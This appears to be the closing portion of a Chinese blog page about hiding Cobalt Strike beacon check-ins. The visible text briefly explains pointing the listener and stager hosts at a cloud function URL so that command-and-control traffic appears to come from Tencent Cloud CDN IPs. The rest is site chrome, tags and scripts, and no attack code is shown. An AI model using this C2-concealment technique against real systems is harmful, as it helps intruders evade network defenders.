+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/25.png" srcset="/img/loading.gif" lazyload alt="25"></p>
+<p>Listeners的host和Hosts和Stager Host都设置为你的云函数URL</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/26.png" srcset="/img/loading.gif" lazyload alt="26"></p>
+<p>抓包看流量，C2通信的HOST是api的域名IP是腾讯云的CDN服务器IP</p>
+<p>我的博客<a target="_blank" rel="noopener" href="https://kosakd.top/">kosakd blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="category-chain-item">技术分享</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+        <a href="/tags/CobaltStrike%E6%95%99%E7%A8%8B/" class="print-no-link">#CobaltStrike教程</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CobaltStrike上线隐藏</div>
+      <div>http://example.com/2021/06/09/CobaltStrike上线隐藏/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>kosakd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年6月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/06/10/%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="渗透信息收集">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">渗透信息收集</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/12/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="Xmind命令执行漏洞复现">
+                        <span class="hidden-mobile">Xmind命令执行漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"gF7Poz0cTuckolpWrCfYGvtE-gzGzoHsz","appKey":"5jhRfVVUhhJhosdWxiVM6xbd","path":"window.location.pathname","placeholder":"期待你的留言","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
